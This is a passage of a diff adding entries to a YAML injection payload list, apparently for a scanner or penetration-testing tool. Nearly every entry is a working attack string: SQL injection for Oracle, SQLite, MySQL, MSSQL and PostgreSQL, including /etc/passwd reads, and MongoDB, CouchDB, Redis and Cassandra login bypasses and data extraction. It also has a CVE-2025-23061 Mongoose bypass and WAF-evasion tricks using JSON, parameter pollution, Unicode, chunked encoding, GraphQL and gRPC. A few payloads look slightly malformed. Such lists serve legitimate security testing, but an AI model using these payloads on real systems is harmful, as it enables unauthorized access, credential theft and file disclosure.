+  - id: "dbms-oracle-002"
+    name: "Oracle column enumeration"
+    category: "dbms_specific"
+    dbms: "oracle"
+    payload: "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- "
+    description: "Lists columns of the USERS table."
+    tags: ["oracle", "enumeration"]
+
+  - id: "dbms-oracle-003"
+    name: "Oracle file read (UTL_FILE)"
+    category: "dbms_specific"
+    dbms: "oracle"
+    payload: "' UNION SELECT UTL_FILE.GET_LINE('/etc/passwd',1),NULL FROM dual-- "
+    description: "Read files via UTL_FILE (requires privileges)."
+    tags: ["oracle", "file-read"]
+
+  - id: "dbms-sqlite-001"
+    name: "SQLite table enumeration"
+    category: "dbms_specific"
+    dbms: "sqlite"
+    payload: "' UNION ALL SELECT name,NULL FROM sqlite_master WHERE type='table'-- "
+    description: "Lists all tables from sqlite_master."
+    tags: ["sqlite", "enumeration"]
+
+  - id: "dbms-sqlite-002"
+    name: "SQLite column enumeration"
+    category: "dbms_specific"
+    dbms: "sqlite"
+    payload: "' UNION ALL SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='users'-- "
+    description: "Retrieves the CREATE statement for the users table."
+    tags: ["sqlite", "enumeration"]
+
+  - id: "dbms-sqlite-003"
+    name: "SQLite file read"
+    category: "dbms_specific"
+    dbms: "sqlite"
+    payload: "' UNION ALL SELECT readfile('/etc/passwd'),NULL-- "
+    description: "SQLite readfile() extension (if loaded)."
+    tags: ["sqlite", "file-read"]
+
+  # ---------------------------------------------------------------------------
+  #  10. NoSQL INJECTION
+  # ---------------------------------------------------------------------------
+  - id: "nosql-mongo-001"
+    name: "MongoDB $ne auth bypass"
+    category: "nosql"
+    dbms: "mongodb"
+    payload: '{"username": {"$ne": null}, "password": {"$ne": null}}'
+    description: "MongoDB not-equal operator injection — bypasses login checks."
+    tags: ["nosql", "mongodb", "auth-bypass"]
+    references: ["https://www.invicti.com/blog/web-security/nosql-injection-cheat-sheet"]
+
+  - id: "nosql-mongo-002"
+    name: "MongoDB $gt auth bypass"
+    category: "nosql"
+    dbms: "mongodb"
+    payload: '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+    description: "Greater-than empty-string injection."
+    tags: ["nosql", "mongodb", "auth-bypass"]
+
+  - id: "nosql-mongo-003"
+    name: "MongoDB $regex extraction"
+    category: "nosql"
+    dbms: "mongodb"
+    payload: '{"username": "admin", "password": {"$regex": "^a"}}'
+    description: "Character-by-character password extraction via regex."
+    tags: ["nosql", "mongodb", "extraction"]
+
+  - id: "nosql-mongo-004"
+    name: "MongoDB $where JS injection"
+    category: "nosql"
+    dbms: "mongodb"
+    payload: '{"$where": "1==1"}'
+    description: "JavaScript execution in $where clause — deprecated in MongoDB 8.0+."
+    tags: ["nosql", "mongodb", "rce-adjacent"]
+    references: ["https://www.invicti.com/blog/web-security/nosql-injection-cheat-sheet"]
+
+  - id: "nosql-mongo-005"
+    name: "MongoDB $where time-based"
+    category: "nosql"
+    dbms: "mongodb"
+    payload: '{"$where": "var d = new Date(); while (new Date() - d < 5000) {}"}'
+    description: "Time-based blind NoSQL injection via JavaScript busy-loop."
+    tags: ["nosql", "mongodb", "blind-time"]
+
+  - id: "nosql-mongo-006"
+    name: "MongoDB $or nested $where (CVE-2025-23061)"
+    category: "nosql"
+    dbms: "mongodb"
+    payload: '{"$or": [{"$where": "sleep(5000) || true"}]}'
+    description: "Nested $where inside $or bypasses Mongoose's top-level operator filter (CVE-2025-23061)."
+    tags: ["nosql", "mongodb", "cve-2025-23061", "bypass"]
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2025-23061"]
+
+  - id: "nosql-redis-001"
+    name: "Redis CRLF injection"
+    category: "nosql"
+    dbms: "redis"
+    payload: "key\r\nSET injected_key \"malicious_value\"\r\n"
+    description: "RESP protocol injection via CRLF — usually reachable via SSRF/Gopher."
+    tags: ["nosql", "redis", "crlf", "ssrf"]
+
+  - id: "nosql-redis-002"
+    name: "Redis EVAL Lua"
+    category: "nosql"
+    dbms: "redis"
+    payload: "EVAL \"return redis.call('GET', KEYS[1])\" 1 secret_key"
+    description: "Server-side Lua execution — only if EVAL is exposed."
+    tags: ["nosql", "redis", "rce"]
+
+  - id: "nosql-couch-001"
+    name: "CouchDB Mango $ne"
+    category: "nosql"
+    dbms: "couchdb"
+    payload: '{"selector": {"username": {"$ne": "nobody"}, "password": {"$ne": "invalid"}}}'
+    description: "Mango query operator injection for authentication bypass."
+    tags: ["nosql", "couchdb", "auth-bypass"]
+
+  - id: "nosql-couch-002"
+    name: "CouchDB $regex extraction"
+    category: "nosql"
+    dbms: "couchdb"
+    payload: '{"selector": {"username": "admin", "password": {"$regex": "^p"}}}'
+    description: "Regex-based data extraction via Mango selector."
+    tags: ["nosql", "couchdb", "extraction"]
+
+  - id: "nosql-cassandra-001"
+    name: "Cassandra CQL injection"
+    category: "nosql"
+    dbms: "cassandra"
+    payload: "' OR '1'='1"
+    description: "CQL uses SQL-like syntax; classic quote-based injection applies."
+    tags: ["nosql", "cassandra", "auth-bypass"]
+
+  # ---------------------------------------------------------------------------
+  #  11. CLOUD-SPECIFIC PAYLOADS
+  #     Managed DB services sometimes expose version/metadata in unique ways.
+  # ---------------------------------------------------------------------------
+  - id: "cloud-aws-001"
+    name: "AWS RDS MySQL version"
+    category: "cloud_specific"
+    dbms: "mysql"
+    cloud: "aws"
+    payload: "' UNION ALL SELECT @@version_compile_os,NULL-- "
+    description: "Reveals the RDS OS platform via version_compile_os."
+    tags: ["cloud", "aws", "rds", "mysql"]
+
+  - id: "cloud-aws-002"
+    name: "AWS RDS MSSQL @@SERVERNAME"
+    category: "cloud_specific"
+    dbms: "mssql"
+    cloud: "aws"
+    payload: "' UNION SELECT @@SERVERNAME,NULL-- "
+    description: "Reveals the RDS instance identifier."
+    tags: ["cloud", "aws", "rds", "mssql"]
+
+  - id: "cloud-azure-001"
+    name: "Azure SQL DB_NAME()"
+    category: "cloud_specific"
+    dbms: "mssql"
+    cloud: "azure"
+    payload: "' UNION SELECT DB_NAME(),NULL-- "
+    description: "Reveals Azure SQL database name."
+    tags: ["cloud", "azure", "sql"]
+
+  - id: "cloud-gcp-001"
+    name: "GCP Cloud SQL PostgreSQL version"
+    category: "cloud_specific"
+    dbms: "postgresql"
+    cloud: "gcp"
+    payload: "' UNION ALL SELECT version(),NULL-- "
+    description: "GCP Cloud SQL exposes standard PostgreSQL version string."
+    tags: ["cloud", "gcp", "sql", "postgresql"]
+
+  # ---------------------------------------------------------------------------
+  #  12. LEGACY PAYLOADS (1990s–2000s)
+  #     Old syntax still lives on legacy appliances, ASP classics, and
+  #     forgotten internal applications.
+  # ---------------------------------------------------------------------------
+  - id: "legacy-001"
+    name: "Classic ASP MSSQL bypass"
+    category: "legacy"
+    dbms: "mssql"
+    payload: "' OR 1=1-- "
+    description: "The quintessential 1990s ASP login bypass."
+    tags: ["legacy", "classic", "asp"]
+
+  - id: "legacy-002"
+    name: "Classic PHP MySQL bypass"
+    category: "legacy"
+    dbms: "mysql"
+    payload: "' OR '1'='1'-- "
+    description: "The original PHP/MySQL login bypass."
+    tags: ["legacy", "classic", "php"]
+
+  - id: "legacy-003"
+    name: "Legacy Oracle dual table"
+    category: "legacy"
+    dbms: "oracle"
+    payload: "' OR 1=1 FROM dual-- "
+    description: "Old Oracle payloads often forgot the FROM dual clause; this variant includes it."
+    tags: ["legacy", "oracle"]
+
+  - id: "legacy-004"
+    name: "Legacy Sybase quote"
+    category: "legacy"
+    dbms: "generic"
+    payload: "' OR 1=1-- "
+    description: "Sybase (pre-SQL Server) injection — same syntax as MSSQL."
+    tags: ["legacy", "sybase"]
+
+  # ---------------------------------------------------------------------------
+  #  13. MODERN BYPASS (2025 / 2026)
+  #     New WAF architectures, JSON body parsing, protocol-level tricks.
+  # ---------------------------------------------------------------------------
+  - id: "modern-001"
+    name: "JSON-chained SQLi (Claroty Team82)"
+    category: "modern_bypass"
+    dbms: "all"
+    waf: "generic"
+    payload: '{"id": "1 UNION SELECT NULL--", "extra": {"$ne": null}}'
+    description: "Appending JSON syntax to a SQLi payload confuses WAF JSON parsers — bypasses AWS, Cloudflare, F5, Imperva (Claroty 2025 research)."
+    tags: ["modern", "json", "waf-bypass", "2025"]
+    references: ["https://www.cybersecurity-help.cz/vdb/SB2025092401"]
+
+  - id: "modern-002"
+    name: "Content-Type confusion"
+    category: "modern_bypass"
+    dbms: "all"
+    waf: "generic"
+    payload: "Content-Type: application/x-www-form-urlencoded\r\n\r\nid=1' UNION SELECT NULL-- "
+    description: "Send SQLi in a body that claims a different Content-Type than the parser expects."
+    tags: ["modern", "header", "content-type", "2026"]
+
+  - id: "modern-003"
+    name: "HTTP parameter pollution (HPP)"
+    category: "modern_bypass"
+    dbms: "all"
+    waf: "generic"
+    payload: "id=1&id=1' UNION SELECT NULL-- "
+    description: "Duplicate parameters — WAF inspects the first, application uses the second."
+    tags: ["modern", "hpp", "2025"]
+
+  - id: "modern-004"
+    name: "Unicode normalization bypass"
+    category: "modern_bypass"
+    dbms: "all"
+    waf: "generic"
+    payload: "SELECT * FROM users WHERE id = 1 ％％OR 1=1-- "
+    description: "Full-width percent signs / Unicode homoglyphs evade byte-oriented signatures."
+    tags: ["modern", "unicode", "2026"]
+
+  - id: "modern-005"
+    name: "Chunked transfer encoding split"
+    category: "modern_bypass"
+    dbms: "all"
+    waf: "generic"
+    payload: "SELECT * FROM users WHERE id = 1 UNION SELECT NULL-- "
+    description: "Split the payload across chunked-encoding boundaries so the WAF reassembles it differently than the origin."
+    tags: ["modern", "chunked", "2025"]
+
+  - id: "modern-006"
+    name: "GraphQL variable injection"
+    category: "modern_bypass"
+    dbms: "all"
+    payload: '{"query": "query($id: String!) { user(id: $id) { name } }", "variables": {"id": "1'' UNION SELECT password FROM users--"}}'
+    description: "SQLi delivered through a GraphQL variable — most WAFs only inspect the query string."
+    tags: ["modern", "graphql", "2026"]
+
+  - id: "modern-007"
+    name: "gRPC/Protobuf field injection"
+    category: "modern_bypass"
+    dbms: "all"
+    payload: "field: \"1' UNION SELECT NULL--\""
+    description: "SQLi embedded in a Protobuf field — WAFs rarely parse binary gRPC bodies."
+    tags: ["modern", "grpc", "protobuf", "2026"]
+
+# =============================================================================
+#  END OF PAYLOAD LIST
+# =============================================================================
